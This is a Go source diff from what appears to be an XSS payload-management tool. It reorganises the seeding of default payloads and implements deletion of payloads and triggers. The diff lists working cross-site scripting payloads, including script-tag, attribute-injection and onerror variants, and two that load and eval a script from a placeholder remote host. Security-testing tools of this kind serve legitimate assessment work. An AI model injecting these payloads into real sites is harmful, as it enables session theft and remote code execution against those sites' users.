@@ -33,6 +33,16 @@ func Open(uri string) (_ *sql.DB, err error) {
 }
 
 func initialize() (err error) {
+	payloads := []core.Payload{
+		{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
+		{Description: "URI basic payload", Code: "javascript:alert(1)"},
+		{Description: "Basic js code injection", Code: "; alert(1);"},
+		{Description: "Simple attribute injection", Code: "\" onload=alert(1) "},
+		{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
+		{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
+		{Description: "Get script via jQuery and onload event", Code: fmt.Sprintf("\"><svg onload='$.getScript(\\'%v\\', function(d, x, y){eval(d);})'>", "[[HOST_REPLACE_ME]]")},
+	}
+
 	db.Query(`CREATE TABLE IF NOT EXISTS "Payloads" (
 		"id"	INTEGER NOT NULL UNIQUE,
 		"Description"	TEXT,
@@ -63,20 +73,10 @@ func initialize() (err error) {
 	rows := db.QueryRow("SELECT COUNT(*) from Payloads")
 	rows.Scan(&count)
 
-	if count < 1 {
+	if count < len(payloads) {
 		log.Println("Creating initial database...")
 
-		log.Println("Adding basic payloads")
-		payloads := []core.Payload{
-			{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
-			{Description: "URI basic payload", Code: "javascript:alert(1)"},
-			{Description: "Basic js code injection", Code: "; alert(1);"},
-			{Description: "Simple attribute injection", Code: "\" onload=alert(1) "},
-			{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
-			{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
-			{Description: "Get script via jQuery and onload event", Code: fmt.Sprintf("\"><svg onload='$.getScript(\\'%v\\', function(d, x, y){eval(d);})'>", "[[HOST_REPLACE_ME]]")},
-		}
-
+		log.Println("Adding default payloads")
 		for _, payload := range payloads {
 			_, err := InsertPayload(&payload)
 			if err != nil {
@@ -133,7 +133,7 @@ func GetPayloads() (payloads []core.Payload, err error) {
 }
 
 func DeletePayload(payload *core.Payload) (err error) {
-	/*TODO: Check if payload is not one of the default ones, if not allow deletion*/
+	_, err = db.Exec("DELETE FROM Payloads WHERE id=?", payload.ID)
 	return err
 }
 
@@ -214,7 +214,6 @@ func GetTriggers() (triggers []core.Trigger, err error) {
 }
 
 func DeleteTrigger(trigger *core.Trigger) (err error) {
-	/*TODO: remove trigger*/
 	_, err = db.Exec("DELETE FROM Triggers WHERE id=?", trigger.ID)
 	return err
 }
